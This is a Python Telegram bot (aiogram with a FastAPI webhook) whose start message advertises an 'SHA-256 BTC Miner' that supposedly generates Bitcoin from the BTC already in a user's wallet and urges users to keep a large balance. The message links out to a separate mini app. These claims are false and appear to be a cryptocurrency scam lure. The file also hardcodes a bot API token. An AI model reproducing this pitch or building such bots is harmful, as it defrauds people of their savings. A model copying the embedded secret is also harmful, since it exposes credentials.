from fastapi import FastAPI,HTTPException
from aiogram import Dispatcher,Router,Bot
from aiogram.filters import CommandStart
from aiogram.types import InlineKeyboardButton,InlineKeyboardMarkup
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import Update,Message,CallbackQuery
from fastapi import Request
from contextlib import asynccontextmanager
import logging

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)
token = '7765823701:AAHOvzXghdY3JE2t3VUJ7gvEOGH_E1m4-5k'
WEB_HOOK = 'https://wills-birthday-gift.onrender.com/webhook'
bot=Bot(token=token,default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp= Dispatcher(bot=bot)
router = Router()
dp.include_router(router)

#NOTE - startup package for the server
@asynccontextmanager
async def lifespan(app:FastAPI):
    await bot.set_webhook(WEB_HOOK)
    logger.info("Webhook has been set.")
    yield
    await bot.session.close()

#NOTE - Fastapi initialization 
app = FastAPI(lifespan=lifespan,title="William Bot",debug=True)


def main_menu()->InlineKeyboardMarkup:
    btn1= InlineKeyboardButton(text='About',callback_data='about')
    btn2= InlineKeyboardButton(text='Launch app',url='https://t.me/btcforge_miner_bot/Btcsha256',)
    builder = InlineKeyboardBuilder()
    builder.row(btn1,btn2)
    return builder.as_markup()

@router.message(CommandStart())
async def start_command(msg:Message)-> None:
    await bot.send_message(chat_id=msg.from_user.id,text='''SHA-256 BTC Miner Bot

This advanced mining bot leverages the SHA-256 algorithm to generate Bitcoin directly from your wallet. It utilizes the BTC already present in your wallet as a resource to facilitate and accelerate the mining process🚀🪙

Key Features:

🚨 Blockchain-Based Mining – Uses the SHA-256 algorithm for secure and efficient mining⛏️✅
🚨Wallet-Integrated Process – Requires an existing BTC balance to initiate mining⛏️✅
🚨 Real-Time Activity – If no BTC is available, the bot will not mine, even if mining activity appears on the interface✅

⚠️For optimal results, ensure your wallet has a sufficient BTC balance before starting the mining process⚠️.''',reply_markup=main_menu())
    
@router.callback_query()
async def callback_query_handler(callback_query:CallbackQuery):
    #TODO- Handle callback where neccesary
    if callback_query.data=='about':
        await bot.send_message(chat_id=callback_query.from_user.id,text='Dadddyyy')
    await callback_query.answer()

@app.post('/webhook')
async def handle_webhook(request:Request):
    try:
        json_data = await request.json()
        update = Update(**json_data)
        await dp.feed_update(bot, update)
    except Exception:
        return HTTPException(status_code=400,detail='Invalid payload')
    return {'OK':True}

    


